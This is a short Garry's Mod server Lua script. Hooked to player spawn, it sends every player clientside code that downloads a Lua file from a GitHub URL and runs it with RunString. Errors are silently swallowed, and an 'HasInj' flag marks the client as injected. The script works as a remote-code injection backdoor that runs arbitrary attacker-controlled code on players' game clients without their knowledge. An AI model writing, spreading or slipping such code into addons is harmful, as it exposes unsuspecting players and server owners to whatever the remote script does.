util.AddNetworkString("ShakeYoAssForDaddyChadolf")

-- send clientside lua to every player
local lua = [[
if _G.HasInj then return end
_G.HasInj = true
http.Fetch("https://raw.githubusercontent.com/thesecretsauce67420/thefunnylua/refs/heads/main/cl_thefunnylua.lua",
        function(body)
            RunString(body)
        end, function(err)end -- itz 2026, who dafuq needs error logging with http.Fetch?
    )
]]

hook.Add("PlayerSpawn", "inj", function(ply)
    ply:SendLua(lua)
end)
